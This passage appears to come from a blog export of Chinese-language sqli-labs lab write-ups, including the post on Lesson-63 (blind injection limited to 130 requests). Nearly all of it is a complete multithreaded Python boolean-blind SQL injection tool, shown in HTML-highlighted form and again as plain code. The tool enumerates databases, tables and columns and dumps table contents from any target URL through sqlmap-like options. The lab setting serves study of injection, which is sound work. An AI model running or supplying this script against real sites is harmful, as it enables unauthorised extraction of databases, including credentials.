class=\"params\">(url, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + \\</span><br><span class=\"line\">                <span class=\"string\">\" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--current-db'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'cudbs'</span>, help=<span class=\"string\">'Retrieve DBMS current database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.cudbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        get_cu_db_name(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>解决的思路方向,优化脚本。</p>\n<p>1.其中一项是secret_XXXX 后四位由 大写字母和数字 组成,可以只猜解后这四位<br>2.发现大小写字母和数字组成,可以缩小区域<br>3.优化算法..脚本中有些请求是不必要的<br>4.直接默认猜解challenges？</p>\n<p>暂时想到这么多…</p>\n"},{"title":"sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求","date":"2018-11-29T06:05:28.000Z","_content":"\n# sqli-labs lession-63 GET-盲注-变化2-仅允许130次请求\n\n---\n\n## 注入\n\n闭合点\n\n`http://10.60.17.35:8082/Less-63/?id=1'+and+1=1%23`\n\n## 脚本\n\n![001](/img/sql/Lesson-63/001.png)\n\n![002](/img/sql/Lesson-63/002.png)\n\n![003](/img/sql/Lesson-63/003.png)\n\n![004](/img/sql/Lesson-63/004.png)\n\n```\n#python3\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nfeature = 'Your Login name'\nhead = \"'\"\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef binary_search_db(url, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).text\n            if feature in html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n# 获取当前数据库长度\n\n\ndef get_db_len(url):\n    payload = head + \\\n        \" AND ORD(MID((SELECT LENGTH(database())),%d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前数据库长度: %d' % lenth)\n    return lenth\n\n# 获取当前数据库名\n\n\ndef get_cu_db_name(url):\n    lenth = get_db_len(url)\n    dbname = \"\"\n    for i in range(lenth):\n        payload = head + \\\n            \" and ascii(substr((select database()),%d,1))\" % (i + 1)\n        dbname += and_method(url, payload)\n        print('[-]当前猜解', dbname)\n    print('[*]', dbname)\n\n\ndef getdbnum(url):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).text\n        if feature in html:\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d--+\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url):\n    num = getdbnum(url)\n    lenth = get_all_db_len(url, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d--+\"\n    # print(payload)\n    num = binary_search_db(url, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, dbname):\n    num = get_table_num(url, dbname)\n    lenth = get_all_table_len(url, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \\\n                \" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, tbname, dbname):\n    num = 0\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, tbname, dbname):\n    num = get_column_num(url, tbname, dbname)\n    lenth = get_all_columns_len(url, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, tbname, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, coname, tbname, dbname, i):\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, coname, tbname, dbname, count):\n    lenth = get_data_len(url, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = head + \" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, tbname, dbname, coname=None):\n    num = get_data_num(url, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--current-db', action='store_true',\n                      dest='cudbs', help='Retrieve DBMS current database')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url)\n    elif options.url and options.cudbs:\n        url = options.url\n        get_cu_db_name(url)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, tbname, dbname, coname)\n    elif 